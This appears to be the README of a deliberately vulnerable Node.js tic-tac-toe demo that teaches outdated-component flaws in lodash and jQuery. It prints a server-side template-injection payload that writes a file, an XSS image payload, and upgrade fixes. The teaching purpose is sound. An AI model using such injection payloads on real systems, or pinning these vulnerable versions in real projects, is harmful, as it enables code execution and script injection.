# Tic‑Tac‑Toe Vulnerable Demo

This intentionally vulnerable Node.js app demonstrates **OWASP Top 10 – A06: Vulnerable & Outdated Components**. It uses:

* **lodash 4.17.20** – vulnerable to Command Injection via `_.template` (CVE‑2021‑23337).
* **jQuery 3.4.1** – vulnerable to XSS via DOM manipulation functions (CVE‑2020‑11022).

## Setup

```bash
npm install
npm start
```

Visit http://localhost:3000.

## Exploits

### Remote Code Execution (server side)

```bash
curl -X POST http://localhost:3000/api/message \
  -H "Content-Type: application/json" \
  -d '{ "msg": "<% require(\"fs\").writeFileSync(\"pwned.txt\", \"owned\") %>" }'
```

A file `pwned.txt` will be created in the project root.

### Cross‑Site Scripting (client side)

Set the player name to include:

```html
<img src=x onerror=alert('XSS')>
```

An alert box pops.

## Fix

```bash
npm install lodash@4.17.21 jquery@3.7.1
```

Escape output on server and use `$('#scores').text(player.name)` instead of `html()`.